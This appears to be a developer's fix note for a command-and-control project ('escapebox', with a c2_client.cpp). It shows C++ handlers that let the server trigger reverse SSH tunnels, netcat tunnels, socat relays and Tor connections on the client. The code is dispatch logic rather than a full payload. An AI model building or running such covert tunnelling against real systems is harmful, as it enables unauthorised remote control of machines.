# Network Tunnel Commands Fix

## Issue
When pressing 'N' to execute network tunnel commands (SSH/Netcat/Socat), the server was logging the activity but the commands weren't actually being executed on the client side.

## Root Cause
1. The keyboard shortcut was adding commands to `clientCommandQueue`
2. The server's `handleClient` function was retrieving these commands
3. But there were no specific handlers in the switch statement for:
   - CMD_REVERSE_SSH
   - CMD_NETCAT_TUNNEL  
   - CMD_SOCAT_RELAY
4. Additionally, the text commands sent by the server weren't being recognized by the client

## Solution Applied

### 1. Added Server-Side Handlers
In `escapebox.cpp`, added case statements in the `handleClient` function:
```cpp
case CMD_TOR_CONNECT:
    executeTorConnect(clientSocket, clientId);
    break;
    
case CMD_TOR_API_CALL:
    executeTorApiCall(clientSocket, clientId);
    break;
    
case CMD_REVERSE_SSH:
    executeReverseSSH(clientSocket, clientId);
    break;
    
case CMD_NETCAT_TUNNEL:
    executeNetcatTunnel(clientSocket, clientId);
    break;
    
case CMD_SOCAT_RELAY:
    executeSocatRelay(clientSocket, clientId);
    break;
```

### 2. Added Client-Side Text Command Handlers
In `c2_client.cpp`, added handlers for the text commands:
```cpp
} else if (decrypted.find("SSH:REVERSE:TUNNEL:") == 0) {
    logActivity("CLIENT_DEBUG", "SSH_TUNNEL_CMD", "Received SSH reverse tunnel command");
    executeReverseSSH();
} else if (decrypted.find("NETCAT:TUNNEL:CREATE:") == 0 || decrypted.find("PROCESS:CREATE:") == 0 && decrypted.find("nc.exe") != std::string::npos) {
    logActivity("CLIENT_DEBUG", "NETCAT_CMD", "Received netcat command");
    executeNetcatTunnel();
} else if (decrypted.find("SOCAT:RELAY:CREATE:") == 0 || decrypted.find("DOWNLOAD:") == 0 && decrypted.find("socat") != std::string::npos) {
    logActivity("CLIENT_DEBUG", "SOCAT_CMD", "Received socat command");
    executeSocatRelay();
}
```

### 3. Simplified Server Execute Functions
Updated the server-side execute functions to send clear trigger commands:
- `executeReverseSSH`: Sends `"SSH:REVERSE:TUNNEL:EXECUTE\n"`
- `executeNetcatTunnel`: Sends `"NETCAT:TUNNEL:CREATE:EXECUTE\n"`
- `executeSocatRelay`: Sends `"SOCAT:RELAY:CREATE:EXECUTE\n"`

## Result
Now when you press 'N':
1. Commands are added to the queue ✓
2. Commands are processed by the server handler ✓
3. Server sends recognizable text commands to client ✓
4. Client receives and executes the commands ✓

## Testing
To test the fix:
1. Build the project
2. Start server: `escapebox.exe server`
3. Start client: `escapebox.exe client <server_ip>`
4. Press 'N' in the server console
5. Observe client executing SSH, Netcat, and Socat commands

The network tunnel commands should now work properly!
